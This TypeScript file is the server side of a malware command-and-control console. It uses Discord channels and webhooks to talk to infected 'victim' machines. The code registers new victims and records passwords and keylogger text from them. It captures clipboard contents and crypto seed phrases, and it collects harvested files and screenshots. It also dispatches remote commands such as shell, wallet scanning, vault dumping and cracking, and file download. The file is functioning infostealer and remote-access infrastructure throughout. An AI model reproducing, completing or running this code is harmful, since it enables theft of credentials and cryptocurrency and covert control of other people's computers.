import { createHash, randomBytes } from 'node:crypto';
import { createWriteStream } from 'node:fs';
import { mkdir, readFile, rm, stat, writeFile } from 'node:fs/promises';
import { basename, join } from 'node:path';
import { prisma } from '../lib/db';
import { sealSecret, sha256hex, randomToken } from '../lib/crypto';
import { ArtifactStatus } from '@prisma/client';
import { processArtifact } from './artifact';
import { publish } from '../lib/bus';
import { env } from '../lib/env';
import { notify, notifyVictimNew } from './notify';
import { isTaskQueuedAck, parseResultName } from '../lib/discord';

type DiscordConfig = {
  botToken?: string;
  botTokenB64?: string;
  guildId?: string;
  categoryId?: string;
};

type Channel = { id: string; name: string; parent_id?: string | null };
type Attachment = { id: string; filename: string; size: number; url: string; content_type?: string };
type Message = {
  id: string;
  channel_id: string;
  content: string;
  author?: { id: string; bot?: boolean };
  webhook_id?: string;
  attachments?: Attachment[];
  embeds?: Array<{ title?: string; fields?: Array<{ name: string; value: string }> }>;
};

const API = 'https://discord.com/api/v10';
const POLL_MS = 4000;
// A slow channel only needs presence occasionally; 120 s created too much
// noise and Discord traffic when several agents were offline.
const PING_MS = 600_000;
const PART_RE = /^(.*)\.part(\d{3,})$/;

let token = '';
let guildId = '';
let botId = '';
let running = false;
let loop: ReturnType<typeof setTimeout> | null = null;
let lastError = '';
let lastPoll = 0;
let polled = 0;
let ingested = 0;
const lastPing = new Map<string, number>();
let lastBootstrap = 0;
const pendingSeed = new Map<string, number>();
const outbound = new Set<string>();

function log(message: string): void {
  console.log(`[discord-bridge] ${message}`);
}

async function config(): Promise<DiscordConfig | null> {
  const inline = process.env['DISCORD_TOKEN'];
  if (inline) {
    return { botToken: inline, guildId: process.env['DISCORD_GUILD_ID'] };
  }
  for (const path of [join(process.cwd(), 'discord.json'), join(process.cwd(), '..', 'discord.json')]) {
    try {
      const parsed = JSON.parse(await readFile(path, 'utf8')) as DiscordConfig;
      if (parsed.botToken || parsed.botTokenB64) return parsed;
    } catch {
      // next path
    }
  }
  return null;
}

async function rest<T>(method: string, path: string, body?: unknown, raw = false): Promise<T> {
  const target = path.startsWith('http') ? path : `${API}${path}`;
  const response = await fetch(target, {
    method,
    headers: {
      authorization: `Bot ${token}`,
      ...(body === undefined ? {} : { 'content-type': 'application/json' })
    },
    body: body === undefined ? undefined : JSON.stringify(body)
  });
  if (response.status === 429) {
    const retry = Number(response.headers.get('retry-after') ?? '2');
    await sleep((Number.isFinite(retry) ? retry : 2) * 1000);
    return rest(method, path, body, raw);
  }
  if (!response.ok) {
    throw new Error(`discord ${method} ${path} -> ${response.status}`);
  }
  if (raw) return (await response.arrayBuffer()) as T;
  if (response.status === 204) return undefined as T;
  const text = await response.text();
  return (text ? JSON.parse(text) : undefined) as T;
}

const sleep = (ms: number) => new Promise((resolve) => setTimeout(resolve, ms));

/** Deletes bridge traffic so presence never piles up in a channel. */
async function removeMessage(channelId: string, messageId: string): Promise<void> {
  try {
    await fetch(`${API}/channels/${channelId}/messages/${messageId}`, {
      method: 'DELETE',
      headers: { authorization: `Bot ${token}` }
    });
  } catch {
    // a missing message is already clean
  }
}

async function cleanupPings(channelId: string): Promise<void> {
  try {
    const messages = await rest<Message[]>('GET', `/channels/${channelId}/messages?limit=100`);
    const ids = messages.filter((message) => message.content === 'ping').map((message) => message.id);
    if (ids.length === 1) {
      await removeMessage(channelId, ids[0]!);
    } else if (ids.length > 1) {
      await rest('POST', `/channels/${channelId}/messages/bulk-delete`, { messages: ids });
    }
  } catch {
    // cleanup is best effort
  }
}

export function bridgeConfigured(): boolean {
  return Boolean(token && guildId);
}

export function bridgeStatus() {
  return {
    enabled: running,
    bot: botId || null,
    guild: guildId || null,
    polled,
    ingested,
    lastPoll,
    error: lastError || null
  };
}

export async function startDiscordBridge(): Promise<boolean> {
  if (running) return true;
  if (process.env['DISCORD_BRIDGE'] === '0') return false;
  const cfg = await config();
  if (!cfg) return false;
  token = cfg.botToken ?? (cfg.botTokenB64 ? Buffer.from(cfg.botTokenB64, 'base64').toString('utf8') : '');
  guildId = cfg.guildId ?? process.env['DISCORD_GUILD_ID'] ?? '';
  if (!token || !guildId) {
    lastError = 'token_or_guild_missing';
    return false;
  }
  try {
    const me = await rest<{ id: string }>('GET', '/users/@me');
    botId = me.id;
    running = true;
    log(`connected as ${botId} on guild ${guildId}`);
    await runBridgeBootstrap();
    for (const link of await prisma.discordLink.findMany({ select: { channelId: true }, take: 100 })) {
      await cleanupPings(link.channelId);
    }
    schedule(1000);
    return true;
  } catch (error) {
    lastError = error instanceof Error ? error.message : String(error);
    log(`start failed: ${lastError}`);
    return false;
  }
}

export function stopDiscordBridge(): void {
  running = false;
  if (loop) clearTimeout(loop);
}

function schedule(ms: number): void {
  if (!running) return;
  if (loop) clearTimeout(loop);
  loop = setTimeout(() => void tick(), ms);
}

async function tick(): Promise<void> {
  if (!running) return;
  try {
    if (Date.now() - lastBootstrap > 60_000) {
      lastBootstrap = Date.now();
      await ensureLinks();
    }
    await pollChannels();
    await dispatchTasks();
    await maybePing();
    lastError = '';
  } catch (error) {
    lastError = error instanceof Error ? error.message : String(error);
    log(`tick: ${lastError}`);
  }
  lastPoll = Date.now();
  schedule(POLL_MS);
}

async function pollChannels(): Promise<void> {
  const links = await prisma.discordLink.findMany({ include: { victim: true }, take: 100 });
  for (const link of links) {
    const query = link.lastMessageId === '0' ? '?limit=25' : `?after=${link.lastMessageId}&limit=50`;
    let messages: Message[];
    try {
      messages = await rest<Message[]>('GET', `/channels/${link.channelId}/messages${query}`);
      if (link.missingAt) {
        await prisma.discordLink.update({ where: { id: link.id }, data: { missingAt: null } }).catch(() => undefined);
        await prisma.event.create({ data: { victimId: link.victimId, kind: 'discord_channel_restored', data: { channelId: link.channelId } } }).catch(() => undefined);
        await notify({
          kind: 'discord_channel_restored',
          victimId: link.victimId,
          title: 'Discord channel restored',
          body: `${link.victim.hostname} · ${link.channelId}`,
          link: `/victims/${link.victimId}`,
          dedupeKey: `channel_restored:${link.channelId}`,
          dedupeMs: 5 * 60_000
        }).catch(() => undefined);
        link.missingAt = null;
      }
    } catch (error) {
      const text = error instanceof Error ? error.message : '';
      if (text.endsWith('404') || text.endsWith('403')) {
        await prisma.discordLink.update({ where: { id: link.id }, data: { lastMessageId: '0', missingAt: new Date() } }).catch(() => undefined);
        if (!link.missingAt) {
          await prisma.event.create({ data: { victimId: link.victimId, kind: 'discord_channel_missing', data: { channelId: link.channelId } } }).catch(() => undefined);
          await notify({
            kind: 'discord_channel_missing',
            victimId: link.victimId,
            title: 'Discord channel missing',
            body: `${link.victim.hostname} · channel ${link.channelId} was deleted or is unreadable`,
            link: `/victims/${link.victimId}`,
            dedupeKey: `channel_missing:${link.channelId}`,
            dedupeMs: 30 * 60_000
          }).catch(() => undefined);
        }
      }
      continue;
    }
    messages.sort((a, b) => (BigInt(a.id) < BigInt(b.id) ? -1 : 1));
    for (const message of messages) {
      try {
        await handleMessage(link, message);
      } catch (error) {
        lastError = error instanceof Error ? error.message : String(error);
      }
      await prisma.discordLink.update({ where: { id: link.id }, data: { lastMessageId: message.id } }).catch(() => undefined);
      polled++;
    }
    await sleep(220);
  }
}

async function ensureLinks(): Promise<void> {
  const build = await prisma.build.findFirst({ where: { universal: true, status: 'ready' } });
  if (!build) {
    lastError = 'no_universal_build';
    return;
  }
  const channels = await rest<Channel[]>('GET', `/guilds/${guildId}/channels`);
  const liveIds = new Set(channels.map((channel) => channel.id));
  const ignored = new Set((await prisma.discordIgnore.findMany({ select: { channelId: true } })).map((row) => row.channelId));
  for (const channel of channels) {
    if (!channel.name.startsWith('sync-')) continue;
    if (ignored.has(channel.id)) continue;
    const existing = await prisma.discordLink.findUnique({ where: { channelId: channel.id } });
    if (existing) {
      if (existing.missingAt) await prisma.discordLink.update({ where: { id: existing.id }, data: { missingAt: null } }).catch(() => undefined);
      if (!existing.webhookUrl) await ensureWebhook(existing.id, existing.channelId);
      continue;
    }
    const raw = channel.name.replace(/^sync-shared-/, '').replace(/^sync-/, '');
    const split = raw.lastIndexOf('-');
    const hostname = (split > 0 ? raw.slice(0, split) : raw).slice(0, 100) || 'discord-host';
    const username = (split > 0 ? raw.slice(split + 1) : 'unknown').slice(0, 100) || 'unknown';
    const known = await prisma.victim.findUnique({
      where: { buildId_hostname_username: { buildId: build.id, hostname, username } },
      include: { discord: true }
    });
    let victim = known;
    let fresh = false;
    if (!victim) {
      victim = await prisma.victim.create({
        data: {
          buildId: build.id,
          hostname,
          username,
          os: 'windows',
          arch: 'x86_64',
          profile: build.profile,
          status: 'online',
          tags: ['discord'],
          deviceTokenEnc: sealSecret(randomToken(32))
        },
        include: { discord: true }
      });
      fresh = true;
    }
    if (victim.discord && liveIds.has(victim.discord.channelId) && victim.discord.channelId !== channel.id) {
      // The victim already has a live channel; this is a second sync- channel.
      continue;
    }
    let linkId: string;
    if (victim.discord) {
      // The channel was recreated with a new id: move the link instead of
      // creating a second row for the same victim.
      await prisma.discordLink.update({
        where: { id: victim.discord.id },
        data: { channelId: channel.id, guildId, lastMessageId: '0', webhookUrl: null, missingAt: null }
      });
      linkId = victim.discord.id;
    } else {
      const created = await prisma.discordLink.create({ data: { channelId: channel.id, guildId, victimId: victim.id } });
      linkId = created.id;
    }
    await ensureWebhook(linkId, channel.id);
    await prisma.event.create({ data: { victimId: victim.id, kind: fresh ? 'discord_link' : 'discord_relink', data: { channelId: channel.id } } }).catch(() => undefined);
    if (fresh) {
      await notifyVictimNew(victim).catch(() => undefined);
      await publish({ type: 'victim.new', victimId: victim.id, at: Date.now(), data: { hostname, transport: 'discord' } });
    }
    log(`linked ${channel.name} -> ${victim.id}`);
  }
}

async function ensureWebhook(linkId: string, channelId: string): Promise<string | null> {
  try {
    const hooks = await rest<Array<{ id: string; token?: string; name: string }>>('GET', `/channels/${channelId}/webhooks`);
    let hook = hooks.find((item) => item.name === 'SPC Console' && item.token);
    if (!hook) {
      hook = await rest<{ id: string; token: string; name: string }>('POST', `/channels/${channelId}/webhooks`, { name: 'SPC Console' });
    }
    if (!hook?.token) return null;
    const url = `https://discord.com/api/webhooks/${hook.id}/${hook.token}`;
    await prisma.discordLink.update({ where: { id: linkId }, data: { webhookUrl: url } });
    return url;
  } catch (error) {
    lastError = error instanceof Error ? error.message : 'webhook_failed';
    return null;
  }
}

async function send(link: { id: string; channelId: string; webhookUrl: string | null }, content: string): Promise<string | null> {
  try {
    if (!link.webhookUrl) {
      const created = await ensureWebhook(link.id, link.channelId);
      if (!created) return null;
      link.webhookUrl = created;
    }
    const response = await fetch(`${link.webhookUrl}?wait=true`, {
      method: 'POST',
      headers: { 'content-type': 'application/json' },
      body: JSON.stringify({ content, username: 'SPC Console', allowed_mentions: { parse: [] } })
    });
    if (!response.ok) throw new Error(`webhook ${response.status}`);
    const message = (await response.json()) as Message;
    outbound.add(message.id);
    return message.id;
  } catch (error) {
    lastError = error instanceof Error ? error.message : 'webhook_send_failed';
    link.webhookUrl = null;
    return null;
  }
}

async function handleMessage(link: { channelId: string; victimId: string }, message: Message): Promise<void> {
  if (!outbound.has(message.id)) {
    // Bridge traffic is not a heartbeat: a dead agent must go stale at 90 s.
    await prisma.victim.update({
      where: { id: link.victimId },
      data: { lastAgentMessageAt: new Date(), status: 'online' }
    }).catch(() => undefined);
  }

  const embed = message.embeds?.find((item) => item.title === 'Fabric Sync');
  if (embed?.fields) {
    const fields = new Map(embed.fields.map((field) => [field.name.toLowerCase(), field.value]));
    await prisma.victim.update({
      where: { id: link.victimId },
      data: {
        hostname: fields.get('hostname') ?? fields.get('host') ?? undefined,
        username: fields.get('user') ?? fields.get('username') ?? undefined,
        os: (fields.get('os') ?? 'windows').split(' ')[0]!.toLowerCase().slice(0, 20),
        osVersion: fields.get('os') ?? '',
        agentVersion: fields.get('agent') ?? fields.get('version') ?? '',
        ip: fields.get('ip') ?? null
      }
    }).catch(() => undefined);
    await prisma.event.create({ data: { victimId: link.victimId, kind: 'hello', data: { fields: Object.fromEntries(fields) } } });
  }

  if (message.content) {
    await handleText(link.victimId, message);
    if (message.content.startsWith('pong') || isTaskQueuedAck(message.content)) {
      void removeMessage(link.channelId, message.id);
    }
  }
  for (const attachment of message.attachments ?? []) {
    try {
      await handleAttachment(link, message, attachment);
    } catch (error) {
      const reason = error instanceof Error ? error.message : 'download_failed';
      const name = basename(attachment.filename);
      const key = `artifact_failed:${link.victimId}:${name}`;
      const duplicate = await prisma.event.findFirst({
        where: { victimId: link.victimId, kind: 'artifact_failed', data: { path: ['name'], equals: name }, createdAt: { gte: new Date(Date.now() - 30 * 60_000) } },
        select: { id: true }
      }).catch(() => null);
      if (!duplicate) {
        await prisma.event.create({ data: { victimId: link.victimId, kind: 'artifact_failed', data: { name, error: reason } } }).catch(() => undefined);
      }
      await notify({
        kind: 'artifact_failed',
        victimId: link.victimId,
        title: 'Attachment failed',
        body: `${name}: ${reason}`,
        link: `/victims/${link.victimId}`,
        dedupeKey: key,
        dedupeMs: 30 * 60_000
      }).catch(() => undefined);
    }
  }
}

function norm(value: string): string {
  return value.replace(/\s+/g, ' ').trim().slice(0, 4000);
}

/** One password row per process+title inside five minutes, with a counter. */
async function recordPassword(victimId: string, process: string, title: string, text: string): Promise<void> {
  const since = new Date(Date.now() - 5 * 60_000);
  const existing = await prisma.keylog.findFirst({
    where: { victimId, process, title, password: true, updatedAt: { gte: since } },
    orderBy: { updatedAt: 'desc' }
  }).catch(() => null);
  if (existing) {
    await prisma.keylog.update({
      where: { id: existing.id },
      data: { text, ts: new Date(), updatedAt: new Date(), count: { increment: 1 } }
    }).catch(() => undefined);
    return;
  }
  await prisma.keylog.create({ data: { victimId, process, title, text, password: true } });
}

/** Clipboard floods collapse onto one row per kind+content inside a minute. */
async function recordClipboard(victimId: string, kind: string, content: string, replaced: string | null): Promise<void> {
  const since = new Date(Date.now() - 60_000);
  const existing = content
    ? await prisma.clipboardEntry.findFirst({
      where: { victimId, kind, content, updatedAt: { gte: since } },
      orderBy: { updatedAt: 'desc' }
    }).catch(() => null)
    : null;
  if (existing) {
    await prisma.clipboardEntry.update({
      where: { id: existing.id },
      data: { replaced, ts: new Date(), updatedAt: new Date(), count: { increment: 1 } }
    }).catch(() => undefined);
    return;
  }
  await prisma.clipboardEntry.create({ data: { victimId, ts: new Date(), process: '', window: '', content, kind, replaced } });
}

async function handleText(victimId: string, message: Message): Promise<void> {
  const content = message.content.trim();
  if (!content) return;
  const dispatched = await prisma.task.count({ where: { victimId, discordMessageId: message.id } });
  if (dispatched > 0) return;
  if (content === 'ping') return;
  if (content.startsWith('pong')) return;
  if (isTaskQueuedAck(content)) return;

  if (content.startsWith('wallet detected:')) {
    await prisma.event.create({ data: { victimId, kind: 'wallet_detected', data: { text: norm(content) } } });
    return;
  }
  if (content.startsWith('password?')) {
    const [proc, title, ...rest] = content.slice(10).split('|');
    await recordPassword(victimId, (proc ?? '').trim(), (title ?? '').trim(), rest.join('|').trim());
    return;
  }
  if (/^seed escrita:/i.test(content)) {
    pendingSeed.set(victimId, Date.now());
    await prisma.event.create({ data: { victimId, kind: 'seed_typed', data: { text: norm(content) } } });
    return;
  }
  if (/^(clipboard|charset)?\s*(seed|xprv|clave privada)/i.test(content)) {
    const value = content.includes(':') ? content.slice(content.lastIndexOf(':') + 1).trim() : '';
    if (value) {
      const clean = norm(value);
      await prisma.event.create({ data: { victimId, kind: 'seed_found', data: { type: 'clipboard', value: clean, source: 'clipboard' } } });
      await notify({
        kind: 'seed',
        victimId,
        title: 'Seed found',
        body: clean.slice(0, 160),
        link: `/victims/${victimId}`,
        dedupeKey: `seed:${victimId}:${createHash('sha256').update(clean).digest('hex')}`
      }).catch(() => undefined);
    }
    return;
  }
  if (content.startsWith('clipboard:')) {
    const body = content.slice(10).trim();
    const arrow = body.lastIndexOf('->');
    const before = arrow > 0 ? body.slice(0, arrow).trim() : body;
    const replaced = arrow > 0 ? body.slice(arrow + 2).trim() : null;
    const space = before.indexOf(' ');
    const kind = space > 0 ? before.slice(0, space) : 'text';
    const original = space > 0 ? before.slice(space + 1) : before;
    await recordClipboard(victimId, kind, original, replaced);
    return;
  }
  if (content.startsWith('Failed:')) {
    await prisma.task.updateMany({
      where: { victimId, status: 'running', discordMessageId: { not: null } },
      data: { status: 'error', error: norm(content), finishedAt: new Date(), leaseUntil: null }
    });
    return;
  }
  if (pendingSeed.has(victimId) && Date.now() - (pendingSeed.get(victimId) ?? 0) < 10_000) {
    const words = content.split(/\s+/).length;
    if (words === 12 || words === 18 || words === 24) {
      pendingSeed.delete(victimId);
      const clean = norm(content);
      await prisma.event.create({ data: { victimId, kind: 'seed_found', data: { type: 'bip39', words, value: clean, source: 'keylogger' } } });
      await notify({
        kind: 'seed',
        victimId,
        title: 'Seed found',
        body: clean.slice(0, 160),
        link: `/victims/${victimId}`,
        dedupeKey: `seed:${victimId}:${createHash('sha256').update(clean).digest('hex')}`
      }).catch(() => undefined);
      return;
    }
  }
  // Terminal text closes shell output and the pseudo-task used to ask the agent
  // to cancel. Crypto tasks finish with an artifact or a result JSON; closing
  // them here would cut them short.
  await prisma.task.updateMany({
    where: { victimId, name: { in: ['shell', 'cancel'] }, status: 'running', discordMessageId: { not: null }, leaseUntil: { gt: new Date() } },
    data: { status: 'done', result: { output: norm(content) } as never, finishedAt: new Date(), leaseUntil: null }
  });
}

async function handleAttachment(link: { channelId: string; victimId: string }, message: Message, attachment: Attachment): Promise<void> {
  const name = basename(attachment.filename).replace(/[^\w.\-]/g, '_').slice(0, 180);
  if (!name) return;
  const duplicate = await prisma.artifact.findUnique({ where: { discordMessageId: `${message.id}:${attachment.id}` } });
  if (duplicate) return;
  const buffer = Buffer.from(await rest<ArrayBuffer>('GET', attachment.url, undefined, true));
  ingested++;
  const part = PART_RE.exec(name);
  const dir = join(env.STORAGE_DIR, 'discord', link.channelId);
  await mkdir(dir, { recursive: true });
  if (part) {
    const base = part[1]!;
    const index = Number(part[2]);
    const path = join(dir, `${base}.part${String(index).padStart(3, '0')}`);
    await writeFile(path, buffer);
    await prisma.discordPart.upsert({
      where: { channelId_base_index: { channelId: link.channelId, base, index } },
      update: { path },
      create: { channelId: link.channelId, base, index, path }
    });
    const parts = await prisma.discordPart.findMany({ where: { channelId: link.channelId, base }, orderBy: { index: 'asc' } });
    if (parts.length === 0) return;
    const max = parts[parts.length - 1]!.index;
    if (parts.length >= max) {
      const merged = join(dir, base);
      const out = createWriteStream(merged);
      for (const row of parts) {
        out.write(await readFile(row.path));
      }
      await new Promise<void>((resolve) => out.end(resolve));
      await rm(merged.slice(0, merged.length - 4) + '.parts', { recursive: true, force: true }).catch(() => undefined);
      await prisma.discordPart.deleteMany({ where: { channelId: link.channelId, base } });
      await forEachPartCleanup(parts.map((row) => row.path));
      await ingestFile(link, `${message.id}:${base}`, base, merged);
    }
    return;
  }
  const path = join(dir, `${message.id}-${name}`);
  await writeFile(path, buffer);
  await ingestFile(link, `${message.id}:${attachment.id}`, name, path);
}

async function forEachPartCleanup(paths: string[]): Promise<void> {
  for (const path of paths) await rm(path, { force: true }).catch(() => undefined);
}

async function ingestFile(link: { channelId: string; victimId: string }, externalId: string, name: string, path: string): Promise<void> {
  const info = await stat(path);
  const lower = name.toLowerCase();
  const prefix = lower.split('-')[0]!;
  const result = parseResultName(name);
  if (result) await closeTaskFromResult(link.victimId, result, path).catch(() => undefined);
  const module = result ? 'result'
    : lower.endsWith('.png') || prefix === 'screenshot' ? 'screenshot'
    : prefix === 'wallets' || lower.startsWith('wallets') ? 'wallets'
    : lower.includes('passwords') || lower.includes('keys') || lower.includes('seeds') || prefix === 'keylogs' ? 'keylogs'
    : lower.endsWith('.zip') ? 'harvest'
    : 'files';
  const artifact = await prisma.artifact.create({
    data: {
      victimId: link.victimId,
      source: 'discord',
      discordMessageId: externalId,
      module,
      bytes: info.size,
      sha256: createHash('sha256').update(await readFile(path)).digest('hex'),
      containerPath: path,
      status: 'queued' as ArtifactStatus
    }
  });
  await prisma.event.create({ data: { victimId: link.victimId, kind: 'artifact_received', data: { name, bytes: info.size, module } } });
  const taskName = module === 'harvest' ? 'harvest' : module === 'screenshot' ? 'screenshot' : module === 'wallets' ? 'scan_wallets' : '';
  if (taskName) {
    await prisma.task.updateMany({
      where: {
        victimId: link.victimId,
        name: taskName,
        discordMessageId: { not: null },
        OR: [{ status: 'running' }, { status: 'error', error: { startsWith: 'timeout' } }]
      },
      data: { status: 'done', result: { artifactId: artifact.id } as never, error: null, finishedAt: new Date(), leaseUntil: null }
    });
  }
  await processArtifact(artifact.id);
}

const ARTIFACT_TASKS = new Set(['scan_wallets', 'screenshot', 'harvest']);
const UUID_RE = /^[0-9a-f]{8}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{12}$/i;

async function closeTaskFromResult(
  victimId: string,
  result: { name: string; id: string },
  path: string
): Promise<void> {
  let payload: { status?: string; error?: string | null; result?: unknown };
  try {
    payload = JSON.parse(await readFile(path, 'utf8')) as typeof payload;
  } catch {
    return;
  }
  const status = payload.status;
  if (status !== 'ok' && status !== 'error' && status !== 'cancelled') return;
  const task = (UUID_RE.test(result.id)
    ? await prisma.task.findFirst({ where: { id: result.id, victimId } })
    : null)
    ?? await prisma.task.findFirst({
      where: {
        victimId,
        name: result.name,
        discordMessageId: { not: null },
        OR: [{ status: { in: ['running', 'queued'] } }, { status: 'error', error: { startsWith: 'timeout' } }]
      },
      orderBy: { createdAt: 'desc' }
    });
  if (!task) return;
  const body = (payload.result && typeof payload.result === 'object' ? payload.result : {}) as never;
  if (status === 'ok' && ARTIFACT_TASKS.has(result.name)) {
    // The ZIP/PNG is the real completion signal for artifact tasks.
    await prisma.task.update({ where: { id: task.id }, data: { result: body, error: null } });
    return;
  }
  const error = status === 'ok' ? null : String(payload.error ?? `${result.name} failed`).slice(0, 2000);
  await prisma.task.update({
    where: { id: task.id },
    data: {
      status: status === 'ok' ? 'done' : status === 'cancelled' ? 'cancelled' : 'error',
      result: body,
      error,
      finishedAt: new Date(),
      leaseUntil: null
    }
  });
  await prisma.event.create({ data: { victimId, kind: 'task_result', data: { taskId: task.id, name: result.name, status } } }).catch(() => undefined);
  if (error) {
    await notify({
      kind: 'task_error',
      victimId,
      title: `Task failed: ${result.name}`,
      body: error,
      link: `/victims/${victimId}`,
      dedupeKey: `task_error:${task.id}`,
      dedupeMs: 30 * 60_000
    }).catch(() => undefined);
  }
}

async function dispatchTasks(): Promise<void> {
  const now = new Date();
  const ignored = new Set((await prisma.discordIgnore.findMany({ select: { channelId: true } })).map((row) => row.channelId));
  const ignoredIds = Array.from(ignored);
  if (ignoredIds.length > 0) {
    await prisma.task.updateMany({
      where: { status: 'queued', victim: { discord: { channelId: { in: ignoredIds } } } },
      data: { status: 'error', error: 'discord_unlinked: channel is ignored; re-link the victim', finishedAt: now, leaseUntil: null }
    });
  }
  await prisma.task.updateMany({
    where: { status: 'queued', victim: { discord: { is: null } } },
    data: { status: 'error', error: 'discord_unlinked: victim has no Discord channel', finishedAt: now, leaseUntil: null }
  });
  await prisma.task.updateMany({
    where: { status: 'running', discordMessageId: { not: null }, leaseUntil: { lt: now } },
    data: { status: 'error', error: 'timeout: no result before the lease expired', finishedAt: now, leaseUntil: null }
  });
  const tasks = await prisma.task.findMany({
    where: { status: 'queued', notBefore: { lte: new Date() }, victim: { discord: { isNot: null } } },
    orderBy: [{ priority: 'desc' }, { createdAt: 'asc' }],
    take: 4,
    include: { victim: { include: { discord: true } } }
  });
  for (const task of tasks) {
    const link = task.victim.discord;
    if (!link) continue;
    const channel = link.channelId;
    const text = commandFor(task.name, task.params as Record<string, unknown>);
    if (!text) {
      await prisma.task.update({ where: { id: task.id }, data: { status: 'error', error: `unsupported_task: ${task.name}`, finishedAt: new Date(), leaseUntil: null } });
      continue;
    }
    if (link.missingAt) {
      await prisma.task.update({ where: { id: task.id }, data: { status: 'error', error: 'discord_channel_missing: recreate the channel or re-link it', finishedAt: new Date(), leaseUntil: null } });
      continue;
    }
    try {
      const messageId = await send(link, text);
      if (!messageId) throw new Error('webhook_unavailable');
      await prisma.task.update({
        where: { id: task.id },
        data: { status: 'running', leaseUntil: new Date(Date.now() + task.timeoutSec * 1000), attempts: { increment: 1 }, discordMessageId: messageId }
      });
      lastPing.set(channel, Date.now());
    } catch (error) {
      await prisma.task.update({
        where: { id: task.id },
        data: { status: 'error', error: `discord_send_failed: ${error instanceof Error ? error.message : 'send_failed'}`, finishedAt: new Date(), leaseUntil: null }
      });
    }
  }
}

function commandFor(name: string, params: Record<string, unknown>): string | null {
  switch (name) {
    case 'scan_wallets': return 'scan_wallets';
    case 'harvest': return 'harvest';
    case 'screenshot': return 'screenshot';
    case 'clip_start': return 'clip_start';
    case 'clip_stop': return 'clip_stop';
    case 'dump_vault': return `dump_vault ${String(params.target ?? '')}`.trim();
    case 'crack_vault': return `crack_vault ${String(params.target ?? '')} ${Number(params.max_seconds ?? 90)}`;
    case 'shell': return `shell ${String(params.command ?? '')}`;
    case 'file_pull': return `download ${String(params.path ?? '')}`;
    default: return null;
  }
}

async function maybePing(): Promise<void> {
  const links = await prisma.discordLink.findMany({ take: 100 });
  const now = Date.now();
  for (const link of links) {
    const previous = lastPing.get(link.channelId);
    if (previous === undefined) {
      // Don't ping every channel immediately after a restart.
      lastPing.set(link.channelId, now);
      continue;
    }
    if (now - previous < PING_MS) continue;
    try {
      const id = await send(link, 'ping');
      if (id) {
        lastPing.set(link.channelId, now);
        // The pong has arrived by then; keep the channel free of old pings.
        setTimeout(() => void removeMessage(link.channelId, id), 60_000);
      }
    } catch {
      // channel lost
    }
  }
}

export async function runBridgeBootstrap(): Promise<void> {
  if (!running) return;
  try {
    await ensureLinks();
  } catch (error) {
    lastError = error instanceof Error ? error.message : String(error);
    log(`bootstrap: ${lastError}`);
  }
}
